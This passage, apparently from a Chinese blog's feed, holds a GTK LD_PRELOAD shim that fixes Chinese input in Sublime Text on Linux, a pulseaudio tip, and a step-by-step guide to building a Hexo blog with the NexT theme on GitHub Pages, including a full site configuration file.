class="line">void</div><div class="line">gdk_region_get_clipbox (const GdkRegion *region,</div><div class="line">            GdkRectangle    *rectangle)</div><div class="line">&#123;</div><div class="line">  g_return_if_fail (region != NULL);</div><div class="line">  g_return_if_fail (rectangle != NULL);</div><div class="line"></div><div class="line">  rectangle-&gt;x = region-&gt;extents.x1;</div><div class="line">  rectangle-&gt;y = region-&gt;extents.y1;</div><div class="line">  rectangle-&gt;width = region-&gt;extents.x2 - region-&gt;extents.x1;</div><div class="line">  rectangle-&gt;height = region-&gt;extents.y2 - region-&gt;extents.y1;</div><div class="line">  GdkRectangle rect;</div><div class="line">  rect.x = rectangle-&gt;x;</div><div class="line">  rect.y = rectangle-&gt;y;</div><div class="line">  rect.width = 0;</div><div class="line">  rect.height = rectangle-&gt;height;</div><div class="line">  //The caret width is 2;</div><div class="line">  //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret.</div><div class="line">  if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) &#123;</div><div class="line">        gtk_im_context_set_cursor_location(local_context, rectangle);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//this is needed, for example, if you input something in file dialog and return back the edit area</div><div class="line">//context will lost, so here we set it again.</div><div class="line"></div><div class="line">static GdkFilterReturn event_filter (GdkXEvent *xevent, GdkEvent *event, gpointer im_context)</div><div class="line">&#123;</div><div class="line">    XEvent *xev = (XEvent *)xevent;</div><div class="line">    if(xev-&gt;type == KeyRelease &amp;&amp; GTK_IS_IM_CONTEXT(im_context)) &#123;</div><div class="line">       GdkWindow * win = g_object_get_data(G_OBJECT(im_context),&quot;window&quot;);</div><div class="line">       if(GDK_IS_WINDOW(win))</div><div class="line">         gtk_im_context_set_client_window(im_context, win);</div><div class="line">    &#125;</div><div class="line">    return GDK_FILTER_CONTINUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void gtk_im_context_set_client_window (GtkIMContext *context,</div><div class="line">          GdkWindow    *window)</div><div class="line">&#123;</div><div class="line">  GtkIMContextClass *klass;</div><div class="line">  g_return_if_fail (GTK_IS_IM_CONTEXT (context));</div><div class="line">  klass = GTK_IM_CONTEXT_GET_CLASS (context);</div><div class="line">  if (klass-&gt;set_client_window)</div><div class="line">    klass-&gt;set_client_window (context, window);</div><div class="line"></div><div class="line">  if(!GDK_IS_WINDOW (window))</div><div class="line">    return;</div><div class="line">  g_object_set_data(G_OBJECT(context),&quot;window&quot;,window);</div><div class="line">  int width = gdk_window_get_width(window);</div><div class="line">  int height = gdk_window_get_height(window);</div><div class="line">  if(width != 0 &amp;&amp; height !=0) &#123;</div><div class="line">    gtk_im_context_focus_in(context);</div><div class="line">    local_context = context;</div><div class="line">  &#125;</div><div class="line">  gdk_window_add_filter (window, event_filter, context);</div><div class="line">&#125;</div></pre></td></tr></table></figure><ol><li>安装 C/C++ 的编译环境和 gtk libgtk2.0-dev</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install build-essential</div><div class="line">sudo apt-get install libgtk2.0-dev</div></pre></td></tr></table></figure><ol><li>编译共享内库</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</div></pre></td></tr></table></figure><ol><li>设置 LD_PRELOAD 并启动 Sublime Text</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_PRELOAD=./libsublime-imfix.so subl</div></pre></td></tr></table></figure><ol><li>修改 <code>/usr/share/applications/sublime_text.desktop</code> 为</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[Desktop Entry]</div><div class="line">[...]</div><div class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text %F</div><div class="line">[...]</div><div class="line"></div><div class="line">[Desktop Action Window]</div><div class="line">[...]</div><div class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text -n</div><div class="line">[...]</div><div class="line"></div><div class="line">[Desktop Action Document]</div><div class="line">[...]</div><div class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text --command new_file</div><div class="line">[...]</div></pre></td></tr></table></figure><p>不要忘了把 <code>libsublime-imfix.so</code> 放到 <code>/opt/sublime_text/</code> 中</p><ol><li>修改 <code>/usr/bin/subl</code> 为:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh</div><div class="line">export LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so</div><div class="line">exec /opt/sublime_text/sublime_text “$@”</div></pre></td></tr></table></figure><p>重启电脑，可以看到Sublime能够输入中文了。</p><h4 id="没有声音"><a href="#没有声音" class="headerlink" title="没有声音???"></a>没有声音???</h4><p>其实并不是不支持声卡驱动了。<br>只是root用户下默认关闭。<br>虽然在setting的sounds里没能看到识别的声卡信息。可是其实驱动是装好的。<br>用<code>pulseaudio –start</code>，就有了。</p><p>输入以下一行，就不用每次启动都要输入那行代码了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl –user enable pulseaudio</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Hexo 3.x 博客搭建指南(NEXT主题)</title>
      <link href="/2017/01/21/Hexo-3-x-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97-NEXT%E4%B8%BB%E9%A2%98/"/>
      <url>/2017/01/21/Hexo-3-x-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97-NEXT%E4%B8%BB%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>GitHub Pages 本用于介绍托管在 GitHub 的项目，也可以用来搭建博客，有300M免费空间。</p><p>hexo是一个基于Node.js的静态博客程序，可以方便的生成静态网页托管在github和Heroku上。作者是来自台湾的<a href="https://github.com/hexojs/hexo" target="_blank" rel="external">tommy351</a>。<br>优势：</p><blockquote><p>生成静态页面快<br>支持 Markdown<br>兼容于 Windows, Mac &amp; Linux<br>部署方便。日常使用仅需五个命令。<br>高扩展性、自订性，文件少、小，易理解</p></blockquote><h4 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h4><p>使用hexo博客必须配置SSH。</p><p>打开git bash，输入<code>cd ~/.ssh</code>，如果果提示：No such file or directory 说明未配置SSH。</p><ul><li><strong>本地生成密钥对</strong><br><code>ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</code>，注意命令中的大小写不要搞混。按提示指定保存文件夹，不设置密码。</li><li><strong>添加公钥到Github</strong></li></ul><ol><li>根据上一步的提示，找到公钥文件（默认为id_rsa.pub），用记事本打开，全选并复制。</li><li>登录Github，右上角 头像 -&gt; <code>Settings</code> —&gt; <code>SSH keys</code> —&gt; <code>Add SSH</code> key。把公钥粘贴到key中，填好title并点击 Add key。</li><li>git bash中输入命令<code>ssh -T git@github.com</code>，选yes，等待片刻可看到成功提示。</li></ol><ul><li><strong>修改本地的ssh remote url，不用https协议，改用git协议</strong></li></ul><ol><li>Github仓库中获取ssh协议相应的url</li><li>本地仓库执行命令<code>git remote set-url origin SSH对应的url</code>，配置完后可用<code>git remote -v</code>查看结果</li></ol><p>这样<code>git push</code>或<code>hexo d</code>时不再需要输入账号密码。</p><h4 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h4><p>注，以下命令行需要在Git终端中执行(右键单击 -&gt; <code>Git bash</code>)。</p><ul><li>安装<a href="http://git-scm.com/" target="_blank" rel="external">Git</a>：下载安装后，注册Github账号并配置Git和SSH公私钥</li><li>安装<a href="https://nodejs.org/en/" target="_blank" rel="external">Node.js</a></li><li>安装hexo：<code>npm install -g hexo</code>，可用<code>hexo -v</code>查看版本。这里我用的是<strong>3.1.1</strong>。也可以指定版本：<code>npm install hexo@3.1.1 -g</code></li><li>创建hexo文件夹：新建放置博客的文件夹，进入并执行命令<code>hexo init</code>。hexo 会在目标文件夹建立网站所需要的所有文件。</li><li>安装依赖包：<code>npm install</code></li><li>创建Github Repository：Repository名字必须是<code>你的Github名.github.io</code>，比如我是<code>loveNight.github.io</code></li><li>部署：打开博客根目录下的<code>_config.yml</code>文件，末尾添加如下信息。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">deploy:</div><div class="line">  <span class="built_in">type</span>: git</div><div class="line">  repository: 上一步的Github仓库地址，项目主页点SSH再复制URL</div><div class="line">  branch: master</div></pre></td></tr></table></figure><p>然后执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo generate <span class="comment"># 生成静态页面，可以简化为hexo g</span></div><div class="line">hexo deploy <span class="comment"># 部署到Github，可以简化为hexo d</span></div></pre></td></tr></table></figure><p>浏览器访问<code>loveNight.github.io</code>就能看到自己的Blog了，一般延迟十分钟左右才能看到效果。一开始看到404页面不要惊慌，耐心等等。</p><p>手打党请注意，配置文件的冒号后必须有一个空格。</p><p>如果报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Deployer not found:git</div></pre></td></tr></table></figure><p>运行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-deployer-git --save</div></pre></td></tr></table></figure><h4 id="hexo使用"><a href="#hexo使用" class="headerlink" title="hexo使用"></a>hexo使用</h4><h5 id="生成静态页面"><a href="#生成静态页面" class="headerlink" title="生成静态页面"></a>生成静态页面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo generate</div></pre></td></tr></table></figure><h5 id="本地启动"><a href="#本地启动" class="headerlink" title="本地启动"></a>本地启动</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo server</div></pre></td></tr></table></figure><p>浏览器输入<code>localhost:4000</code>就可以看到效果。当你修改了文章或配置文件时，保存文件再刷新浏览器就能看到修改后的效果，非常方便。</p><h5 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo new post &quot;title&quot;  # 生成新文章：\source\_posts\title.md，可省略post</div></pre></td></tr></table></figure><h5 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo new page &quot;title&quot;</div></pre></td></tr></table></figure><p>post、page等可以改成其他layout，可用layout在scaffolds目录下查看。在同目录下创建文件来添加自己的layout，也可以编辑现有的layout，比如post的layout默认是<code>\scaffolds\post.md</code>。</p><h5 id="编辑文章"><a href="#编辑文章" class="headerlink" title="编辑文章"></a>编辑文章</h5><p>打开新建的文章<code>\source\_posts\postName.md</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">title: HelloWorld！ # 文章页面上的显示名称，可以任意修改，不会出现在URL中</div><div class="line">date: 2015-11-09 15:56:26 # 文章生成时间，一般不改</div><div class="line">categories:   # 文章分类目录，参数可省略</div><div class="line">    - 随笔</div><div class="line">    - 瞬间</div><div class="line">tags:   # 文章标签，参数可省略</div><div class="line">    - hexo</div><div class="line">    - blog # 个数不限，单个可直接跟在tags后面</div><div class="line">---</div><div class="line">这里开始使用markdown格式输入你的正文。</div></pre></td></tr></table></figure><p>多级分类语法格式：（标签也可以用类似的写法）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 第一种</div><div class="line">categories:</div><div class="line">  - 一级分类</div><div class="line">  - 二级分类</div><div class="line">  - etc...</div><div class="line"></div><div class="line"># 第二种：</div><div class="line">categories: [一级分类, 二级分类]</div></pre></td></tr></table></figure><p>首页文章预览添加图片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">photos:</div><div class="line">  - http://xxx.com/photo1.jpg</div><div class="line">  - http://xxx.com/photo2.jpg</div></pre></td></tr></table></figure><p>正文中可以使用``设置文章摘要 如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">以上显示在摘要中</div><div class="line">&lt;!--more--&gt;</div><div class="line">以下是余下全文</div></pre></td></tr></table></figure><p>more 以上内容即是文章摘要，如果设置了主页只显示摘要，则more以下内容点击 <code>Read More</code> 链接打开全文才显示。</p><h5 id="简单命令"><a href="#简单命令" class="headerlink" title="简单命令"></a>简单命令</h5><p>hexo现在支持更加简单的命令格式了，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">hexo g == hexo generate # 生成</div><div class="line">hexo d == hexo deploy # 部署 # 可与hexo g合并为 hexo d -g</div><div class="line">hexo s == hexo server # 本地预览</div><div class="line">hexo n == hexo new # 写文章</div></pre></td></tr></table></figure><h5 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h5><p>博客中的图片文件可以直接放在source文件夹下，部署时上传到Github仓库中。但是Github项目容量有限，而且主机在国外，访问速度较慢，把图片放在国内的图床上是个更好的选择。我用的是<a href="https://portal.qiniu.com/signup?code=3lgo2c4fgwv9u" target="_blank" rel="external">七牛云存储</a></p><p>免费用户实名审核之后，可以获取10GB永久免费存储空间、每月10GB下载流量、每月10万次Put请求、每月100万次Get请求，做图床绰绰有余。</p><p>注册账号，新建空间，我的新空间名是<code>blog</code>，专门用来放置博客上引用的资源。</p><p>进入空间后点击「内容管理」，再点击「上传」：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/hexo-1.png" alt="1"></p><p>七牛空间没有文件夹的概念，但是允许为文件添加带斜杠<code>/</code>的前缀，用来给资源分类。这里我设置前缀为<code>img/Hexo 3.1.1 静态博客搭建指南/</code>。上传了一张图片,在右侧可以找到外链，复制地址：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/hexo-2.png" alt="2"></p><p>Markdown 插入图片的语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![](图片网址)</div></pre></td></tr></table></figure><p>上传图片 -&gt; 获取外链 -&gt; 写入Markdown，就这么简单！</p><p>由于七牛防盗链的白名单无法添加<code>localhost</code>，暂时不设置防盗链，否则<code>hexo s</code>调试的时候，看不到图片。</p><h4 id="配置博客"><a href="#配置博客" class="headerlink" title="配置博客"></a>配置博客</h4><h5 id="全站配置"><a href="#全站配置" class="headerlink" title="全站配置"></a>全站配置</h5><p><strong>注意：文件中配置项的冒号后面必须加空格，否则报错</strong></p><p>下面有些选项要配置后文的插件才有效，文件中已注明。</p><ul><li><strong>整站的配置</strong>：博客根目录下的<code>\_config.yml</code>文件。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Hexo Configuration</span></div><div class="line"><span class="comment">## Docs: http://hexo.io/docs/configuration.html</span></div><div class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></div><div class="line"></div><div class="line"><span class="comment"># Site</span></div><div class="line"><span class="attr">title:</span> ZEROYU <span class="comment"># 站点名</span></div><div class="line"><span class="attr">subtitle:</span> <span class="comment"># 副标题</span></div><div class="line"><span class="attr">description:</span> 一只单线程HACKER</div><div class="line"><span class="attr">author:</span> ZEROYU <span class="comment"># 作者，在站点左下角可以看到</span></div><div class="line"><span class="comment">#avatar: /images/avatar.jpg # 头像。Next主题增加的字段</span></div><div class="line"><span class="attr">language:</span> zh-Hans <span class="comment"># 语言。Next主题增加的字段</span></div><div class="line"><span class="attr">timezone:</span> Asia/Shanghai</div><div class="line"><span class="attr">since:</span> <span class="number">2015</span> <span class="comment"># 博客建立年份，Next主题增加的字段</span></div><div class="line"></div><div class="line"><span class="comment"># 多说 ShortName</span></div><div class="line"><span class="attr">duoshuo_shortname:</span>  <span class="comment"># xxx.duoshuo.com，xxx即是shortname。</span></div><div class="line"></div><div class="line"><span class="comment"># Social links</span></div><div class="line"><span class="attr">social:</span></div><div class="line"><span class="attr">  Github:</span> https://github.com/zer0yu</div><div class="line"><span class="attr">  Weibo:</span> http://weibo.com/Z3r0yu</div><div class="line"><span class="attr">  Email:</span> zeroyu.xyz@gmail.com</div><div class="line">  <span class="comment"># zhihu: http://www.zhihu.com/people/your-user-name</span></div><div class="line"></div><div class="line"><span class="comment"># title, chinese available</span></div><div class="line"><span class="attr">links_title:</span> 友情链接</div><div class="line"><span class="comment"># links</span></div><div class="line"><span class="attr">links:</span></div><div class="line">  我的CSDN博客: http://blog.csdn.net/zeroyu_xyz</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># URL</span></div><div class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></div><div class="line"><span class="attr">url:</span> http://zer0yu.github.io/ <span class="comment"># 网址</span></div><div class="line"><span class="attr">root:</span> /</div><div class="line"><span class="attr">permalink:</span> :year/:month/:day/:title/</div><div class="line"><span class="attr">permalink_defaults:</span></div><div class="line"></div><div class="line"><span class="comment"># Directory</span></div><div class="line"><span class="attr">source_dir:</span> source</div><div class="line"><span class="attr">public_dir:</span> public</div><div class="line"><span class="attr">tag_dir:</span> tags</div><div class="line"><span class="attr">archive_dir:</span> archives</div><div class="line"><span class="attr">category_dir:</span> categories</div><div class="line"><span class="attr">code_dir:</span> downloads/code</div><div class="line"><span class="attr">i18n_dir:</span> :lang  <span class="comment"># 国际化文件夹</span></div><div class="line"><span class="attr">skip_render:</span>   <span class="comment"># 跳过指定文件的渲染</span></div><div class="line"></div><div class="line"><span class="comment"># Writing # 文章布局、写作格式的定义</span></div><div class="line"><span class="attr">new_post_name:</span> :title.md <span class="comment"># File name of new posts</span></div><div class="line"><span class="attr">default_layout:</span> post</div><div class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></div><div class="line"><span class="attr">external_link:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></div><div class="line"><span class="attr">filename_case:</span> <span class="number">0</span>   <span class="comment"># 1 为小写， 2 为大写</span></div><div class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span>  <span class="comment"># 显示草稿</span></div><div class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span>  <span class="comment"># 启动asset文件夹</span></div><div class="line"><span class="attr">relative_link:</span> <span class="literal">false</span> <span class="comment"># 链接改为与根目录的相对地址</span></div><div class="line"><span class="attr">future:</span> <span class="literal">true</span>  <span class="comment"># 显示未来的文章</span></div><div class="line"><span class="attr">highlight:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  line_number:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  auto_detect:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  tab_replace:</span></div><div class="line"></div><div class="line"><span class="comment"># Category &amp; Tag</span></div><div class="line"><span class="attr">default_category:</span> uncategorized</div><div class="line"><span class="attr">category_map:</span></div><div class="line"><span class="attr">tag_map:</span></div><div class="line"></div><div class="line"><span class="comment"># Date / Time format</span></div><div class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></div><div class="line"><span class="comment">## You can customize the date format as defined in</span></div><div class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></div><div class="line"><span class="attr">date_format:</span> YYYY-MM-DD</div><div class="line"><span class="attr">time_format:</span> HH:mm:ss</div><div class="line"></div><div class="line"><span class="comment"># Pagination # 每页显示文章数</span></div><div class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></div><div class="line"><span class="attr">per_page:</span> <span class="number">10</span></div><div class="line"><span class="attr">pagination_dir:</span> page</div><div class="line"></div><div class="line"><span class="comment"># Extensions # 这里配置站点所用主题和插件</span></div><div class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></div><div class="line"><span class="attr">plugins:</span></div><div class="line"><span class="attr">baidusitemap:</span> <span class="comment"># 需要安装插件 npm install hexo-generator-baidu-sitemap@0.1.1 --save</span></div><div class="line"><span class="attr">  path:</span> baidusitemap.xml</div><div class="line"></div><div class="line"><span class="comment"># Extensions</span></div><div class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></div><div class="line"><span class="comment">## Themes: http://hexo.io/themes/</span></div><div class="line"><span class="attr">theme:</span> next</div><div class="line"></div><div class="line"><span class="attr">feed:</span></div><div class="line"><span class="attr">  type:</span> atom       <span class="comment">#feed 类型 (atom/rss2)</span></div><div class="line"><span class="attr">  path:</span> atom.xml   <span class="comment">#rss 路径</span></div><div class="line"><span class="attr">  limit:</span> <span class="number">0</span>        <span class="comment">#在 rss 中最多生成的文章数(0显示所有)</span></div><div class="line"></div><div class="line"><span class="comment"># 自定义站点内容搜索</span></div><div class="line"><span class="comment"># 需要先安装插件：</span></div><div class="line"><span class="comment"># npm install hexo-generator-search --save</span></div><div class="line"><span class="attr">search:</span></div><div class="line"><span class="attr">  path:</span> search.xml</div><div class="line"><span class="attr">  field:</span> all  <span class="comment"># 如只想索引文章，可设置为post</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Deployment # 站点部署到github</span></div><div class="line"><span class="comment">## Docs: http://hexo.io/docs/deployment.html</span></div><div class="line"><span class="attr">deploy:</span></div><div class="line"><span class="attr">  type:</span> git</div><div class="line"><span class="attr">  repository:</span> git@github.com:zer0yu/zer0yu.github.io.git</div><div class="line"><span class="attr">  branch:</span> master</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ---------------下面选项需要对应插件的支持---------------</span></div><div class="line"><span class="comment"># npm install hexo-generator-index --save</span></div><div class="line"><span class="comment"># npm install hexo-generator-archive --save</span></div><div class="line"><span class="comment"># npm install hexo-generator-category --save</span></div><div class="line"><span class="comment"># npm install hexo-generator-tag --save</span></div><div class="line"></div><div class="line"><span class="attr">index_generator:</span></div><div class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">##首页默认10篇文章标题 如果值为0不分页</span></div><div class="line"></div><div class="line"><span class="attr">archive_generator:</span></div><div class="line"><span class="attr">  per_page:</span> <span class="number">20</span> <span class="comment">##归档页面默认20篇文章标题</span></div><div class="line"><span class="attr">  yearly:</span> <span class="literal">true</span>  <span class="comment">##生成年视图</span></div><div class="line"><span class="attr">  monthly:</span> <span class="literal">true</span> <span class="comment">##生成月视图</span></div><div class="line"></div><div class="line"><span class="attr">tag_generator:</span></div><div class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">##标签分类页面默认10篇文章</span></div><div class="line"></div><div class="line"><span class="attr">category_generator:</span></div><div class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">###分类页面默认10篇文章</span></div></pre></td></tr></table></figure><h4 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h4><p>默认主题太丑，换成<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="external">NexT</a>主题。</p><ul><li>安装：在博客根目录下执行<code>git clone https://github.com/iissnan/hexo-theme-next.git themes/next</code>。</li><li>启用：修改博客根目录下的<code>_config.yml</code>配置文件中的<code>theme</code>属性，将其设置为<code>next</code>。</li><li>更新：在<code>themes/next</code>目录下执行<code>git pull</code>。（暂时不需要）</li><li><code>\themes\next\_config.yml</code>修改主题配置。</li></ul><p>我的<code>_config.yml</code>文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div 